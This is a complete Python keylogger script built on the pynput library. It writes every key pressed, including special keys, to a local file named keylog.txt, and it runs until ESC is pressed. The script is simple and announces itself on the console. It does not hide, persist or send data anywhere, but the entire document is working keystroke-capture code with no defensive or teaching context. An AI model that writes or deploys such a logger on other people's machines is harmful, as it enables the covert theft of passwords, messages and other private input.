from pynput import keyboard

# File to store keystrokes
LOG_FILE = "keylog.txt"

# Function to log keystrokes
def log_key(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:  # For regular keys
                log_file.write(key.char)
            else:  # For special keys like Enter, Space, etc.
                log_file.write(f"[{key}]")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Listener functions
def on_press(key):
    log_key(key)

def on_release(key):
    if key == keyboard.Key.esc:  # Stop the keylogger on ESC key
        return False

# Main program
if __name__ == "__main__":
    print(f"Keylogger is running... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
